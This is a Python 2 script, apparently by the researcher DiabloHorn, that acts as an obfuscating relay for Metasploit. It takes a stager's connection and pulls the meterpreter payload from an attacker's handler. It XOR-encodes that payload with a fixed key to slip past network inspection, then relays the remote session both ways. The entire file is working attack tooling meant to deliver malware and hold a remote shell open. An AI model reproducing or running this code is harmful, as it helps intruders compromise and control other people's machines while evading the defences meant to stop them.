#!/usr/bin/env python
#Author: DiabloHorn http://diablohorn.wordpress.com
#Thanks @ Danny, for listening to my incoherent evening ramblings & my PEBCAK's
#As always, /s freenode #metasploit is a great place to ask questions :)
#metasploit doesn't accept connections from 127.0.0.1
#http://www.kartook.com/2010/10/linux-how-to-add-loopback-on-ubuntu/
#nice clean example of traffic forwarding
#http://www.linux-support.com/cms/forward-network-connections-with-python/

import sys
import struct
from socket import *
import thread

BUFF = 1024
HOST = ''
PORT = 0 
XORKEY = 0x50 #default value, do change
MSFIP = ''
MSFPORT = 0

#handle the initial stager connection
def handler(clientsock,addr):
    msfsock = socket(AF_INET, SOCK_STREAM)
    msfsock.connect((MSFIP, MSFPORT))
    msfdata = ''
    #read and send payload length to meterpreter
    msfdata = msfsock.recv(4)
    clientsock.send(msfdata)
    datalen = struct.unpack('<I',msfdata)[0]
    print "payload size %s" % datalen
    #now start sending and xor'ing the data
    while datalen > 0:    
        msfdata = msfsock.recv(BUFF)
        xorreddata = ''
        for i in range(len(msfdata)):
            xorreddata += chr((ord(msfdata[i]) ^ XORKEY) & 0xFF)        
        clientsock.sendall(xorreddata)
        rl = len(msfdata)
        datalen = datalen - rl
        print "send data %s remaining %s" % (rl,datalen) 
    #we are done with obfuscation, just relay traffic from now on
    print "Starting loop"
    thread.start_new_thread(trafficloop,(msfsock,clientsock))
    thread.start_new_thread(trafficloop,(clientsock,msfsock))    

#traffic relay loop  
def trafficloop(source,destination):
    string = ' '
    while string:
        string = source.recv(BUFF)
        if string:
            destination.sendall(string)
        else:
            source.shutdown(socket.SHUT_RD)
            destination.shutdown(socket.SHUT_WR)    

def usage():
    print "Encrypting/Obfuscating Proxy"
    print "DiabloHorn http://diablohorn.wordpress.com"
    print "%s <listen ip> <listen port> <msfhandler ip> <msfhandler port>" % sys.argv[0]
    print "%s 10.0.0.1 9999 10.10.10.100 4444" % sys.argv[0]    
    sys.exit()
    
if __name__=='__main__':

    if len(sys.argv) != 5:
        usage()
        
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    MSFIP = sys.argv[3]
    MSFPORT = int(sys.argv[4])
    
    ADDR = (HOST, PORT)
    serversock = socket(AF_INET, SOCK_STREAM)
    serversock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    serversock.bind(ADDR)
    serversock.listen(5)
    while 1:
        print 'waiting for connection...'
        clientsock, addr = serversock.accept()
        print '...connected from:', addr
        thread.start_new_thread(handler, (clientsock, addr))

